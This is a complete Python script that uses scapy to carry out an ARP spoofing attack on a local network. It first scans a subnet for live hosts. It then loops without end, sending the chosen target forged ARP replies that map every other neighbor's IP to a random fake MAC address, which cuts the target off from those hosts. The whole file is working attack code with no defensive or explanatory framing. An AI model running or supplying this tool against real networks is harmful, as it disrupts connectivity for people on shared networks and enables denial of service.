#!/usr/bin/python3
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from sys import argv, stdout
from random import random
from time import sleep
from scapy.all import conf, srp1, sendp, Ether, ARP
from netaddr import IPNetwork

if len(argv) != 4:
	print("%s iface net target" % argv[0])
	exit()

conf.verb = 0
conf.iface = argv[1]
net = argv[2]
target = argv[3]

def random_mac():
	return ":".join(["%02x"%int(random()*0xff) for i in range(6)])

neighbors = {}
'''results,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=(str(ip) for ip in IPNetwork(net))))
for result in results:
	query,answer = result
	neighbors[answer[ARP].psrc] = answer[ARP].hwsrc
	print("[*] {ip} {mac}".format(ip=answer[ARP].psrc, mac=answer[ARP].hwsrc))
'''
for ip in IPNetwork(net):
	answer = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=str(ip)),timeout=0.1)
	if answer:
		neighbors[answer[ARP].psrc] = answer[ARP].hwsrc
		print("\n[+] {ip} {mac}".format(ip=answer[ARP].psrc, mac=answer[ARP].hwsrc))
	else:
		stdout.write("\r[*] {ip}".format(ip=str(ip)))
		stdout.flush()

if not target in neighbors:
	print("[-] no target")
elif len(neighbors) == 1:
	print("[-] no clients")
else:
	while True:
		for ip in neighbors:
			if ip == target:
				continue
			mac = random_mac()
			sendp(
				Ether(src=mac, dst=neighbors[target])/
				ARP(op=2, psrc=ip, pdst=target, hwsrc=mac, hwdst=neighbors[target])
			)
			stdout.write("\r[+] {target} <--> {ip} {mac}".format(target=target, ip=ip, mac=mac))
			stdout.flush()
			sleep(0.25)
